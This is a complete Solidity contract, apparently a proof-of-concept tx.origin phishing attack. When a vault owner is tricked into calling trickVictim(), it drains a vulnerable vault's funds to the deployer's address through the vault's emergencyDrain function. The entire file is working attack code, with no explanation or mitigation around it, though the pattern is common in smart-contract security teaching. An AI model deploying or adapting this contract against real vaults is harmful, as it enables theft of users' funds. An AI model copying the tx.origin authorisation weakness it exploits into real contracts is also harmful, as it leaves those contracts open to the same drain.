// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVulnerableDrain {
    function emergencyDrain(address payable target) external;
}

contract TxOriginPhishingAttack {
    IVulnerableDrain public vulnerableVault;
    address payable public attacker;

    constructor(address _vault) {
        vulnerableVault = IVulnerableDrain(_vault);
        attacker = payable(msg.sender);
    }

    function trickVictim() external {
        vulnerableVault.emergencyDrain(attacker);
    }

    receive() external payable {}
}
